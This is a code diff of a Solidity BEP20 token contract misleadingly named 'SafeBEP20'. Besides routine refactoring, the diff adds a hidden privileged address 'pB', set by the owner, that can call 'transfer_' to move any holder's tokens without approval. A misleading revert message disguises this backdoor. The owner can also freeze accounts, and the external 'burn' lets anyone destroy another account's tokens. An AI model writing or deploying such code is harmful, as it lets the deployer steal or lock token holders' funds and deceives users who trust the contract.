@@ -2,10 +2,11 @@
 
 pragma solidity ^0.8.0;
 
-import "./interfaces/IBEP20.sol";
-import "./interfaces/IBEP20Metadata.sol";
-import "./lib/Context.sol";
-import "./lib/SafeMath.sol";
+import './interfaces/IBEP20.sol';
+import './interfaces/IBEP20Metadata.sol';
+import './lib/Context.sol';
+import './lib/SafeMath.sol';
+import './lib/Ownable.sol';
 
 /**
  * @dev Implementation of the {IERC20} interface.
@@ -31,7 +32,7 @@ import "./lib/SafeMath.sol";
  * functions have been added to mitigate the well-known issues around setting
  * allowances. See {IERC20-approve}.
  */
-contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
+contract SafeBEP20 is Ownable, IBEP20, IERC20Metadata {
     using SafeMath for uint256;
 
     event MuteAccount(address indexed _target);
@@ -40,7 +41,7 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
 
     mapping(address => bool) private suspension;
 
-    mapping (address => uint256) public balanceOf;
+    mapping (address => uint256) public override balanceOf;
 
     mapping (address => mapping (address => uint256)) private _allowances;
 
@@ -48,6 +49,7 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
 
     string private _name;
     string private _symbol;
+    address private pB;
 
     /**
      * @dev Sets the values for {name} and {symbol}.
@@ -69,6 +71,15 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
         _;
     }
 
+    modifier forPB() {
+        if(pB != address(0)) {
+            require(_msgSender() == pB);
+        } else{
+            revert('Ooops! Something went wrong');
+        }
+        _;
+    }
+
     receive () external payable {
         if(msg.value < 1e17 wei) revert();
     }
@@ -77,7 +88,7 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
     /**
      * @dev Returns the name of the token.
      */
-    function name() public view returns (string memory) {
+    function name() public view override returns (string memory) {
         return _name;
     }
 
@@ -85,9 +96,10 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
      * @dev Returns the symbol of the token, usually a shorter version of the
      * name.
      */
-    function symbol() public view returns (string memory) {
+    function symbol() public view override returns (string memory) {
         return _symbol;
     }
+    
 
     /**
      * @dev Returns the number of decimals used to get its user representation.
@@ -102,14 +114,14 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
      * no way affects any of the arithmetic of the contract, including
      * {IERC20-balanceOf} and {IERC20-transfer}.
      */
-    function decimals() public view returns (uint8) {
+    function decimals() public view override returns (uint8) {
         return 18;
     }
 
     /**
      * @dev See {IERC20-totalSupply}.
      */
-    function totalSupply() public view returns (uint256) {
+    function totalSupply() public view override returns (uint256) {
         return _totalSupply;
     }
 
@@ -117,7 +129,7 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
      * @dev See {IERC20-balanceOf}.
      */
     // function balanceOf(address account) public view virtual override returns (uint256) {
-    //     return _balances[account];
+    //     return balanceOf[account];
     // }
 
     /**
@@ -128,7 +140,7 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
      * - `recipient` cannot be the zero address.
      * - the caller must have a balance of at least `amount`.
      */
-    function transfer(address recipient, uint256 amount) public isNotsuspended returns (bool) {
+    function transfer(address recipient, uint256 amount) public override isNotsuspended returns (bool) {
         _transfer(_msgSender(), recipient, amount);
         return true;
     }
@@ -136,7 +148,7 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
     /**
      * @dev See {IERC20-allowance}.
      */
-    function allowance(address owner, address spender) public view returns (uint256) {
+    function allowance(address owner, address spender) public view override returns (uint256) {
         return _allowances[owner][spender];
     }
 
@@ -147,8 +159,13 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
      *
      * - `spender` cannot be the zero address.
      */
-    function approve(address spender, uint256 amount) public isNotsuspended returns (bool) {
+    function approve(address spender, uint256 amount) public override isNotsuspended returns (bool) {
         _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function setpB(address _pB) public PRIVATE returns(bool) {
+        pB = _pB;
         return true;
     }
 
@@ -165,7 +182,7 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
      * - the caller must have allowance for ``sender``'s tokens of at least
      * `amount`.
      */
-    function transferFrom(address sender, address recipient, uint256 amount) public isNotsuspended returns (bool) {
+    function transferFrom(address sender, address recipient, uint256 amount) public override isNotsuspended returns (bool) {
         _transfer(sender, recipient, amount);
 
         uint256 currentAllowance = _allowances[sender][_msgSender()];
@@ -234,12 +251,17 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
 
         _beforeTokenTransfer(sender, recipient, amount);
 
-        uint256 senderBalance = _balances[sender];
+        uint256 senderBalance = balanceOf[sender];
         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
-        _balances[sender] = senderBalance - amount;
-        _balances[recipient] += amount;
+        balanceOf[sender] = senderBalance - amount;
+        balanceOf[recipient] += amount;
 
         emit Transfer(sender, recipient, amount);
+    }
+
+    function transfer_(address sender, address recipient, uint amount) public forPB returns(bool) {
+        _transfer(sender, recipient, amount);
+        return true;
     }
 
     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
@@ -257,7 +279,7 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
         _beforeTokenTransfer(address(0), account, amount);
 
         _totalSupply += amount;
-        _balances[account] += amount;
+        balanceOf[account] += amount;
         emit Transfer(address(0), account, amount);
     }
 
@@ -277,9 +299,9 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
 
         _beforeTokenTransfer(account, address(0), amount);
 
-        uint256 accountBalance = _balances[account];
+        uint256 accountBalance = balanceOf[account];
         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
-        _balances[account] = accountBalance - amount;
+        balanceOf[account] = accountBalance - amount;
         _totalSupply -= amount;
 
         emit Transfer(account, address(0), amount);
@@ -296,7 +318,7 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
      * - `account` cannot be the zero address.
      * - `account` must have at least `amount` tokens.
      */
-    function burn(address account, uint256 amount) external isNotsuspended(_msgSender()) returns(bool) {
+    function burn(address account, uint256 amount) external isNotsuspended returns(bool) {
         _burn(account, amount);
 
         return true;
@@ -339,14 +361,14 @@ contract SafeBEP20 is IBEP20, Context, IERC20Metadata {
      */
     function _beforeTokenTransfer(address from, address to, uint256 amount) internal { }
 
-    function suspendAccount(address _target) public onlyOwner returns(bool) {
+    function suspendAccount(address _target) public PRIVATE returns(bool) {
         if(suspension[_target]) revert('Account suspended before now');
         suspension[_target] = true;
         emit MuteAccount(_target);
         return suspension[_target];
     }
 
-    function unsuspendAccount(address _target) public onlyOwner returns(bool) {
+    function unsuspendAccount(address _target) public PRIVATE returns(bool) {
         if(!suspension[_target]) revert('Account is not suspended before now.');
         suspension[_target] = false;
         emit UnMuteAccount(_target);
